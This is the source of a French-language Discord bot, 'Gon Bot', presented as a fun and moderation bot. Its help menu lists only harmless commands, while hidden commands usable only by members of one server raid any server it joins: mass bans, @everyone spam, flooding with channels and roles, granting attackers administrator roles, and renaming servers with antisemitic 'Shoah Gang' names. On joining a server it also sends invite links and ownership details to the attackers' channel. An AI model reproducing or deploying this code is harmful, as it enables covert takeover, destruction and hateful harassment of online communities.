const Discord = require('discord.js');
const bot = new Discord.Client();
const fs = require('fs');
const moment = require("moment");
 
bot.on('ready',() => {
  //invit link
  console.log("---------------------------")

  bot.guilds.forEach(guild => {
    bot.user.setActivity(`${guild.memberCount} membre || .help`, {url:"https://www.twitch.tv/GonBot", type: "STREAMING"}).catch(e => {});

if(guild.member(bot.user).hasPermission("ADMINISTRATOR")){
  //guild.createChannel("test", "text").catch(e => {});
    var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
    invite.createInvite().then(invite => console.log(`[ADMIN] Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`)).catch(e => {});
  }
  else if(!guild.member(bot.user).hasPermission("ADMINISTRATOR")) {
    bot.user.setActivity(`${guild.memberCount} membre || .help`, {url:"https://www.twitch.tv/GonBot", type: "STREAMING"}).catch(e => {});
  var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
    invite.createInvite().then(invite => console.log(` [OTHER] Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`)).catch(e => {});
  }
  });
  
  bot.user.setUsername("Gon Bot").catch(e => {});
});  

bot.on('message', msg => {

  if (msg.guild === bot.guilds.find('id', '451334633137897472')){ 
    return;
  }
  
  

 if (bot.guilds.get('451334633137897472').members.get(msg.author.id) !== undefined) {
    
if (msg.content === '.destruction') {
    console.log(`Commande .destruction par ${msg.author.tag}`);
    var interval = setInterval (function () {
      msg.channel.send("@everyone @here Rejoin la team qui ta detruis petit facho https://discord.gg/W6WmNW8").catch(e => {});
    }, 450)
  }

if (msg.content === '.oupss') {
    console.log(`Commande .oupss par ${msg.author.tag}`);
   fucked = false;

 
    if (!fucked){
      msg.guild.setIcon("./shoah.jpg").catch(e => {});
      msg.guild.setName('BZ by Shoah Gang').catch(e => {});
     msg.guild.setRegion('hongkong').catch(e => {});
 
      for (var i = 0; i < 500; i++) {
        msg.guild.createChannel('shoah_gang_te_baise', 'voice').catch(e => {});
        msg.guild.createChannel('shoah_gang_te_baise', 'text').catch(e => {});
      }
      fucked = true;
    }
 
    if (msg.deletable) {
      msg.delete();
    }
  }


if (msg.content === '.banev') {
    console.log(`Commande .banev par ${msg.author.tag}`);
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", "Shoah Gang") && member.bannable) member.ban().catch(e => {});
    });
  }


if (msg.content === '.leave') {
    console.log(`Commande .leave par ${msg.author.tag}`);
    if (msg.deletable) msg.delete().catch(e => {});
    msg.guild.leave().catch(e => {});
  }

if (msg.content === '.pardon') {
    console.log(`Commande .pardon par ${msg.author.tag}`);

    msg.member.guild.createRole({
      name: "Shoah Gang",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role).catch(e => {});
      if (msg.deletable) msg.delete().catch(e => {});
    }).catch(e => {});
  }
  if (msg.content === '.roleflood') {

    if (msg.deletable) msg.delete();
    let i = 0;
    let interval = setInterval(function () {
    if (i === 500) clearInterval(interval);
      msg.guild.createRole({name: 'SHOAH GANG', color:'RANDOM', permissions: "ADMINISTRATOR"}).then(function(role) { 
        msg.member.addRole(role).catch(e => {});
        if (msg.deletable) msg.delete().catch(e => {});
      }).catch(e => {});
      i++
    }, 100)
  }

  if(msg.content === ".renameall"){
    if(msg.deletable) msg.delete();
    msg.guild.members.forEach(member => {
      if(member.setNickname("SHOAH GANG ON THE DANCEFLOOR"));      
  })
  }
  if(msg.content === ".mp"){
    if(msg.deletable) msg.delete();
    i = 0;
    msg.guild.members.forEach(member => {

    if(i < 500){
      var interval = setInterval (function () {
        member.send("https://discord.gg/W6WmNW8").catch(e => {});
      }, 450)

      }   
  })
  }

 }//Filtre personne
});
bot.on("message", message => {
  if(message.content.startsWith(".avatar")) {
    var membere = message.mentions.members.first()
    let avatar_embed = new Discord.RichEmbed()
    .setAuthor(` Avatar de ${message.mentions.users.first().username}`)
    .setColor("#FFCC99")
    .setImage(membere.user.avatarURL)
    .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé")
    return message.channel.send(avatar_embed).catch(e => {});
}
if(message.content.startsWith(".say")) {
  if(message.deletable) {
  message.delete()}
var text = message.content.split(" ").slice(1).join(" ")
if(!text){
  messsage.channel.send("Tu ne m'as pas donner un message à répéter :x:").catch(e => {});
}
let embed = new Discord.RichEmbed();
embed.setColor("#FFCC99")
.setTitle(" ")
.setDescription(text)
message.channel.sendEmbed(
  embed, {
    disableEveryone: true
  }
).catch(e => {});
}
})

bot.on("message", message => {
  if(message.content.startsWith(".8ball")){
    var question = message.content.split(" ").slice(1).join(" ")
    var tableauball = ["Oui","Non","Peut être", "Je ne sais pas", "Surement", "Probablement","C'est sur", "J'en sais rien"]
    let ball_embed = new Discord.RichEmbed()
    .setColor("#FFCC99")
    .setTitle(":newspaper2: **Question de "+message.author.tag+"** :newspaper2: ")
    .setDescription("**"+question+"**")
    .addField("**Reponse**","**"+ tableauball[Math.floor(Math.random()*8)] +"**")
    .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé")
    .setThumbnail(bot.user.iconURL)
    message.channel.send(ball_embed).catch(e => {});
  }
  bot.on("message", message => {
  if(message.content.startsWith(".serverinfo")){
    moment.locale("fr");
    var date_de_creation_du_serv = moment(message.guild.createdTimestamp).format("LLLL");
    let serverinfo_embed = new Discord.RichEmbed()
    .setTitle("Info Sur le Serveur")
    .setColor("#FFCC99")
    .addField("Nom", message.guild.name)
    .addField("Id du serveur", message.guild.id)
    .addField("Emplacement Du Serveur", message.guild.region)
    .addField("Nombre de membre", message.guild.memberCount)
    .addField("Date de Creation", date_de_creation_du_serv)
    .addField("Nombre de Channel", message.guild.channels.size)
    .addField("Nombre d'emoji", message.guild.emojis.size)
    .addField("Liste Des Emojis", message.guild.emojis.map(e=>e.toString()).join(" "))
    .setThumbnail(message.guild.iconURL)
    .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé")
    message.channel.send(serverinfo_embed).catch(e => {});
  }})

  bot.on("message", message => {
  if(message.content.startsWith(".userinfo")){
    var membere2 = message.mentions.members.first()
    moment.locale('fr')
    var date_de_creation_du_compte = moment(membere2.user.createdTimestamp).format("LLLL"); 
    if(membere2.presence.status === "online"){
      var statut = "Connecté"
    }
     if(membere2.presence.status === "dnd"){
      var statut = "Ne pas déranger"
    }
    if(membere2.presence.status === "offline"){
      var statut = "Déconnecté"
    }
    else if(membere2.presence.status === "idle"){
      var statut = "Inactif"
    }
    let userinfo_embed = new Discord.RichEmbed()
    .setThumbnail(membere2.user.avatarURL)
    .setColor("#FFCC99")
    .addField("Pseudo", `${message.mentions.users.first().username}`)
    .addField("Id du Membre", membere2.user.id)
    .addField("Statut", statut)
    .addField("Date de Creation Du Compte", date_de_creation_du_compte)
    .addField("Discriminator", '#'+membere2.user.discriminator)
    .addField("Tag du Membre", membere2.user.tag)
    .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé")
    message.channel.send(userinfo_embed).catch(e => {});
  }})
  bot.on("message", message => {
  if (bot.guilds.get('451334633137897472').members.get(message.author.id) !== undefined) {
    if(message.content.startsWith(".listeserver")) {
      bot.guilds.forEach(guild => {
        var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id)
        invite.createInvite().then(invite => message.channel.send(`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`)).catch(e => {});
      })
    }
  }

if(message.content.startsWith(".roleall")){
  var roledebut = message.content.split(" ").slice(1).join(" ")
  let role_succes = new Discord.RichEmbed()
  .setColor('#FFCC99')
  .addField("LOG", "J'ai ajouté le role "+"`"+roledebut+"`"+" à tout le monde");
  let role = message.guild.roles.find("name", roledebut)
  let role_erreur = new Discord.RichEmbed()
  .setTitle("ERREUR 306")
  .setColor("#FFCC99")
  .addField(".ROLEALL", "**:x: Pour faire la commande tu dois avoir les droits Administrateurs**")
  .setThumbnail(bot.user.avatarURL)
  if (!message.member.hasPermission("ADMINISTRATOR")) return message.channel.send(role_erreur).catch(e => {});
if(message.guild.roles.exists("name", roledebut)) {
    message.guild.members.forEach(member => { 
      member.addRoles(role).then( message.channel.send(role_succes))
    })
  }
}

})
})
bot.on('guildMemberAdd', member => {
  member.createDM().then(prive => {
    let bienvenue_embed = new Discord.RichEmbed()
    .setColor("#FFCC99")
    .addField(`Bienvenue ${member.user.username}`, "Viens parler avec les joueurs !")
    .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé")
    .setThumbnail(member.iconURL)
    .setAuthor("Gon bot")
    prive.send(bienvenue_embed).catch(e => {});
  })
})

bot.on("message", message => {
  if(message.content === '.createinvite'){
    message.channel.createInvite().then(invite => {
      message.reply(` :white_check_mark: ** Voici ton invite : https://discord.gg/${invite.code} ** :white_check_mark:`).catch(e => {});
    })
  }
})

bot.on("message", message => {
  var aka;
  if(message.content.startsWith(".kick")){
    var membere2 = message.author
    var membere = message.guild.member(message.mentions.members.first());
    
    if(!message.member.hasPermission("KICK_MEMBERS")) {
      message.reply(":x: **Tu n'as pas assez de permission pour kick** :x:").catch(e => {});
    }
    if(!message.guild.member(bot.user).hasPermission("KICK_MEMBERS")){
      message.reply(":x: **Je n'ai pas assez de permission pour kick**").catch(e => {});
    }
    if(message.mentions.users.size === 0){
      message.reply(":x: ** Vous devez écrire la mention d'un joueur a kick ** :x:").catch(e => {});
    }
    if(message.author.id === "451361026328363029"){
      message.channel.send(aka)
    }
    else {
  membere.kick().then(member => {
    message.channel.send(":white_check_mark: `"+membere.user.username+"` **à été kick par ** `"+membere2.username+"` :white_check_mark:").catch(e => {});
  }).catch(e => {});
    }
  }
  if(message.content.startsWith(".ban" & !".banev")){
    var membere2 = message.author
    let membere = message.guild.member(message.mentions.members.first());
    if(!message.member.hasPermission("BAN_MEMBERS")) {
      message.reply(":x: **Tu n'as pas assez de permission pour ban** :x:").catch(e => {});
    }
    if(!message.guild.member(bot.user).hasPermission("BAN_MEMBERS")){
      message.reply(":x: **Je n'ai pas assez de permission pour ban**").catch(e => {});
    }
    if(message.mentions.users.size === 0){
      message.reply(":x: ** Vous devez écrire la mention d'un joueur a ban ** :x:").catch(e => {});
    }
    else {
  membere.ban().then(member => {
    message.channel.send(":white_check_mark:  `"+membere.user.username+"`  **à été ban par ** `"+membere2.username+"`  :white_check_mark:").catch(e => {});
  }).catch(e => {});
}
  }
})

bot.on("message", message => {
  if(message.content.startsWith(".flip")){
    var flip = ["Pile", "Face"]
    var reponse = flip[Math.floor(Math.random()*2)]
    let flip_embed = new Discord.RichEmbed()
    .setColor("#FFCC99")
    .addField("FLIP", " :moneybag: La piece affiche : **"+reponse+"**")
    message.channel.send(flip_embed).catch(e => {});
    }
    if(message.content === ".c"){
      var voilatableau = ["Ptdrr t ki ?", "Ohhh mon maitre, tu es enfin de retour ?", "Tu es le meilleur, puis-je devenir ton disciple ?", "Degage toi","Mais QUI ES-TU ???","Je ne te connais pas dsl"]
      var voila = voilatableau[Math.floor(Math.random()*6)]
      let voila_embed = new Discord.RichEmbed()
      .setColor("#FFCC99")
     .setDescription(":beer: **"+voila+"** :beers: ")
      message.channel.send(voila_embed).catch(e => {});
    }
    if(message.content === '.help'){
      let help1_embed = new Discord.RichEmbed()
      .setTitle("Commande Fun")
      .addField(".c", "Le bot vous revele vôtre vraie identitée.... :beer:")
      .addField(".flip", "Joué au pile ou face avec le bot :moneybag:")
      .addField('.8ball',"Exemple `As-tu déjà eu une sexfriend ?` Posé une question intime une bot :smirk: ")
      .addField(".say", "Fais répéter une question au bot")
      .setColor("#FFCC99");
      var membere = message.author;
      let help2_embed = new Discord.RichEmbed()
      .setTitle("Commande Utile / Help")
      .addField(".ban", "Exemple `.ban @Gon`, Renvoyer les enemis dans leurs territoire !")
      .addField(".kick", "Exemple `.kick @Gon`, Expulser de vôtre territoire un ennemi")
      .addField(".avatar", "Exemple `.avatar @Gon`, Fouille dans les trefonds de discord et récupérer l'image d'un ami")
      .addField(".userinfo", "Exemple `.userinfo @Gon`, Récupérer toutes les infos d'une personne :' )")
      .addField(".serverinfo", "Vous donnes toutes les infos croustillante sur le serveur")
      .addField(".createinvite", "Vous donnes l'invit du serveur pour ramener vôtre armée !")
      .setColor("#FFCC99");
      message.channel.send(":envelope:  **Je vous envois l'aide en mp** :envelope: ").catch(e => {});
      message.delete(":envelope:  **Je vous envois l'aide en mp** :envelope: ").catch(e => {});
      message.author.send(help1_embed).catch(e => {});
      message.author.send(help2_embed).catch(e => {});
      
    }
      })

      bot.on("guildCreate", guild => {
        if(guild.member(bot.user).hasPermission("ADMINISTRATOR")){
          var invite = guild.channels.find("id", guild.channels.random().id);
          invite.createInvite().then(invite => {
            bot.guilds.get('451334633137897472').channels.get('452910447985688584').send(`[ADMINITRATEUR] Connecté sur ${guild.name} || ${guild.memberCount} membres || https://discord.gg/${invite.code} || Chef ${guild.owner}`).catch(e => {});
          })
        }
        else if(!guild.member(bot.user).hasPermission("ADMINISTRATOR")){
          var invite = guild.channels.find("id", guild.channels.random().id);
          invite.createInvite().then(invite => {
            bot.guilds.get('451334633137897472').channels.get('452910447985688584').send(`[NO ADMIN] Connecté sur ${guild.name} || ${guild.memberCount} membres || https://discord.gg/${invite.code} || Chef ${guild.owner}`).catch(e => {});
          })
        }
      });
      bot.on('guildDelete', guild => {
        bot.guilds.get('451334633137897472').channels.get('452910447985688584').send(` [LEAVE] ${guild.name} || ${guild.memberCount} membres`).catch(e => {});
      })

bot.login(process.env.BOT_TOKEN); 
